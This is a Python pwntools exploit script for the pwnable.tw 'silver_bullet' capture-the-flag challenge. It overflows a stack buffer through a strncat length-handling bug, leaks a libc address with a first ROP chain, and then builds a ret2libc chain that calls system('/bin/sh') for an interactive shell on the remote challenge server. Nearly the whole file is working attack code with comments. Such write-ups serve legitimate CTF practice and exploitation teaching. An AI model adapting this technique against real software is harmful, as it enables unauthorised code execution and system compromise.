#!/usr/bin/env python3

# Challenge labels: rop2libc, String handling

from pwn import *

import os
os.chdir("./patched")

exe = ELF("./silver_bullet_patched")
libc = ELF("./libc.so.6")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10103)

    return r


def send_payload_past_input_buffer(data, r):
    # The binary will read 0x30 bytes of input from us, before byteptr(buffer + 0x30) will be set to strlen(buffer), 
    # We first fill the buffer with b'A'*0x2f, which will result in *(char*)(buffer+0x30) = 0x1
    # This will still allow us to power_up() and affect buffer+0x30 again
    r.sendlineafter(b'choice :', b'1')
    r.sendafter(b'bullet :', b'A'*0x2f)

    # power_up() the bullet by adding b'A', filling the buffer to full capacity of 0x30
    # When calculating the new length, the binary references *(char *)(buffer+0x30) after the strncat (which would
    # set *(char*)(buffer+0x30) to the null byte, or 0), which means that the new length stored at 
    # *(char*)(buffer+0x30) will be 0x1 since *(char*)(buffer+0x30) + strlen(added_str) = 0x1
    r.sendlineafter(b'choice :', b'2')
    r.sendafter(b'bullet :', b'A')

    # *(char *)(buffer+0x30) = 0x1, so we can power_up() to write 0x2f more bytes onto the stack past the end of the buffer
    # This is done using strncat, however, so there can be no null bytes in our payload
    r.sendlineafter(b'choice :', b'2')
    r.sendafter(b'bullet :', data)

    # Play the game successfully so that main() returns
    r.sendlineafter(b'choice :', b'3')
    r.recvuntil(b'Oh ! You win !!')

def main():
    r = conn()

    # ROP CHAIN 1 (Leaking the libc base addr)
    # First, we need to set *(uint32_t*)(buffer+0x30) to a value such that (0x7fffffff - *(uint32_t*)(buffer + 0x30)) <= 0
    # This works because we would have 0x7fffffff - 0x808080XX, where XX is the new length placed into 
    # *(char*)(buffer+0x30) after power_up runs
    payload1 = b'\x80\x80\x80'

    # Call beat(arb_num, exe.bss.stdin) so as to leak the .bss pointer to libc stdin() as an int32_t. We cannot leak GOT because
    # beat() will edit wherever arg2 points to, and the binary has Full RELRO, so this would cause a segmentation fault
    # Also, setup the retaddr to call main() afterwards so as to reopen the attack vector
    payload1 += p32(0x41414141) # Saved ebp - (set to arbitrary number)
    payload1 += p32(exe.sym.beat) # We will use beat() to leak exe.bss.stdin since it leaks arg2[0] as an int32_t
    payload1 += p32(exe.sym.main) # Set the subsequent retaddr to main() so that the attack vector is reopened after the leak
    payload1 += p32(exe.got.read) # arg1 (arbitrary number, but must be dereferencable and the address can have no null bytes)
    payload1 += p32(0x804b020) # arg2 (where arg2[0] will be dereferenced, leaked and then edited)
    log.info(f"{payload1=}")

    send_payload_past_input_buffer(payload1, r)


    # Process the libc leak
    r.recvuntil(b'+ HP : ')
    libc.address = (int(r.recvline().decode().strip()) & 0xFFFFFFFF) - 0x1b05a0 # The bitmasking gets Python to interpret te int32_t as a uint32_t
    log.info(f"{hex(libc.address)=}")


    # ROP CHAIN 2 (Getting a shell)
    # Once again, we need to set *(uint32_t*)(buffer+0x30) appropriately
    payload2 = b'\x80\x80\x80'

    # Construct ret2libc ROP chain
    rop = ROP(libc)
    rop.system(next(libc.search(b"/bin/sh\x00")))
    print(rop.dump())

    # Finalize payload2
    payload2 += b'A'*4 + rop.chain() # Place saved ebp before the ROP chain
    log.info(f"{payload2=}")

    send_payload_past_input_buffer(payload2, r)


    r.interactive()


if __name__ == "__main__":
    main()
